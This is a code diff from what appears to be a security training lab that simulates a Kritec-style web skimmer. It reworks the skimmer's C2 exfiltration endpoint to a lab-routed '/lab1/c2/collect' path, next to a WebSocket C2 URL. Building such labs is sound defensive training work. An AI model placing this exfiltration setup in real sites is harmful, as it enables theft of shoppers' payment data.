@@ -255,13 +255,9 @@
   // Kritec-style attack: WebSocket C2 communication
   setTimeout(function () {
     // Dynamically determine C2 URLs based on environment
-    const hostname = window.location.hostname
-    let fallbackUrl = 'http://localhost:3000/collect' // Local development default
-
-    // Production and staging - use relative URL since C2 is proxied by nginx
-    if (hostname.includes('run.app') || hostname.includes('pcioasis.com')) {
-      fallbackUrl = window.location.origin + '/collect'
-    }
+    // Use relative path for C2 exfiltration (works in all environments via Traefik)
+    // Traefik routes /lab1/c2/collect to C2 server
+    const fallbackUrl = '/lab1/c2/collect'
 
     const CONFIG = {
       wsUrl: 'ws://localhost:3001/ws', // WebSocket C2 endpoint
